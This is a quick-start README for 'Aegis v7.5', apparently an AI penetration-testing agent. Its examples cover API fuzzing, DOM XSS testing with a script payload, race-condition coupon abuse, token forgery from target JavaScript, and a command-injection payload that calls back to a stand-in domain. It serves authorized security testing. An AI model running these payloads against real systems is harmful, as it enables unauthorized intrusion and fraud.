# Aegis v7.5 Quick Start Guide

Get started with the new Zero-Day Research capabilities in 5 minutes.

## Installation

```bash
# Clone the repository
git clone https://github.com/Yahya-hacker/Aegis_agent.git
cd Aegis_agent

# Install dependencies
pip install -r requirements.txt

# Install additional v7.5 dependencies
pip install playwright selenium webdriver-manager python-nmap

# Install Node.js (for Mirror JS Sandbox)
# Ubuntu/Debian:
sudo apt-get install nodejs

# macOS:
brew install node
```

## Quick Examples

### 1. Genesis Protocol Fuzzer - Find Zero-Days

```python
from tools.genesis_fuzzer import get_genesis_fuzzer
import asyncio

async def fuzz_api():
    fuzzer = get_genesis_fuzzer()
    
    # Define the API structure
    grammar = {
        "email": {"type": "string"},
        "age": {"type": "integer"},
        "role": {"type": "string"}
    }
    
    # Fuzz the endpoint
    result = await fuzzer.fuzz_endpoint(
        url="https://api.example.com/register",
        method="POST",
        grammar=grammar,
        base_payload={"email": "test@example.com", "age": 25, "role": "user"}
    )
    
    print(f"Anomalies found: {len(result['anomalies'])}")
    for anomaly in result['anomalies'][:3]:
        print(f"  [{anomaly['severity']}] {anomaly['reasons']}")

asyncio.run(fuzz_api())
```

### 2. Cortex Memory - Navigate with Intelligence

```python
from agents.enhanced_ai_core import CortexMemory

# Initialize Cortex
cortex = CortexMemory(mission_id="my_pentest")

# Record your path through the application
cortex.record_action(
    action="Login as admin",
    result={"success_score": 1.0, "status_code": 200},
    new_url="https://example.com/dashboard",
    artifacts={"authenticated": True}
)

# Hit a dead end? Backtrack!
backtrack_node = cortex.find_backtrack_path(heuristic="successful")
if backtrack_node:
    cortex.set_current_node(backtrack_node)
    print(f"Backtracked to: {backtrack_node}")

# Visualize your exploitation path
print(cortex.visualize_path())
```

### 3. CDP Hooks - Detect DOM XSS

```python
from tools.cdp_hooks import get_cdp_hooks
import asyncio

async def test_xss():
    cdp = get_cdp_hooks()
    await cdp.initialize()
    
    result = await cdp.test_dom_xss(
        url="https://example.com/search?q=test",
        test_payloads=["<script>alert('XSS')</script>"]
    )
    
    if result['vulnerable']:
        print(f"[!] Found {result['vulnerability_count']} DOM XSS vulnerabilities!")
    
    await cdp.close()

asyncio.run(test_xss())
```

### 4. Chronos Engine - Find Race Conditions

```python
from tools.race_engine import get_chronos_engine
import asyncio

async def test_race():
    engine = get_chronos_engine()
    
    result = await engine.execute_race(
        url="https://example.com/api/redeem-coupon",
        method="POST",
        data={"code": "DISCOUNT50"},
        threads=50
    )
    
    if result['analysis']['has_anomaly']:
        print(f"[!] Race condition detected! Confidence: {result['analysis']['confidence']}%")

asyncio.run(test_race())
```

### 5. Mirror Sandbox - Execute Target's JavaScript

```python
from tools.python_tools import PythonToolManager

tool = PythonToolManager()

# Execute JavaScript from the target site
js_code = """
function generateToken(user, timestamp) {
    return btoa(user + ':' + timestamp + ':secret');
}
"""

token = tool.execute_extracted_js(
    js_code=js_code,
    arguments=["admin", "1640000000"],
    function_name="generateToken"
)

print(f"Generated token: {token}")
```

### 6. Echo OOB - Track Blind Vulnerabilities

```python
from listeners.dns_callback import get_oob_manager

oob = get_oob_manager(callback_domain="your-domain.com")

# Create a tracked payload
payload = oob.create_dns_payload(
    target_url="https://example.com/api/search",
    payload_type="RCE",
    target_parameter="q"
)

print(f"Use this payload: {payload['instrumented_payload']}")
# '; nslookup id-a1b2c3.your-domain.com; #

# Later, when callback is received:
correlation = oob.register_callback(
    payload_id="a1b2c3",
    callback_type="DNS",
    source_ip="192.168.1.100"
)

print(f"Confirmed {correlation['payload_type']} vulnerability!")
```

## Running Tests

```bash
# Run the comprehensive test suite
python test_v7_5_features.py

# Expected output:
# 🎉 ALL TESTS PASSED! Aegis v7.5 'Architect' is ready.
```

## Next Steps

1. **Read the Full Documentation**: [V7_5_FEATURES.md](V7_5_FEATURES.md)
2. **Integration Guide**: See how to combine all 6 modules
3. **Production Setup**: Configure DNS/HTTP listeners for OOB detection
4. **Multi-LLM Guide**: [MULTI_LLM_GUIDE.md](MULTI_LLM_GUIDE.md)

## What Makes v7.5 Different?

**Before v7.5:** Tool Orchestrator
- Ran pre-made tools (Nuclei, SQLMap)
- Found known vulnerabilities
- Linear exploration
- Missed DOM XSS, race conditions, blind vulnerabilities

**After v7.5:** Zero-Day Researcher
- Generates custom mutations
- Finds unknown vulnerabilities
- Graph-based navigation with backtracking
- Detects invisible attack surfaces
- Tests concurrency bugs
- Tracks delayed callbacks

## Need Help?

- **Documentation**: All features documented in `V7_5_FEATURES.md`
- **Examples**: Working code examples in the docs
- **Tests**: Reference implementation in `test_v7_5_features.py`

---

**⚠️ Legal Notice**: Always get explicit authorization before testing any target. Aegis is a tool for authorized security testing only.
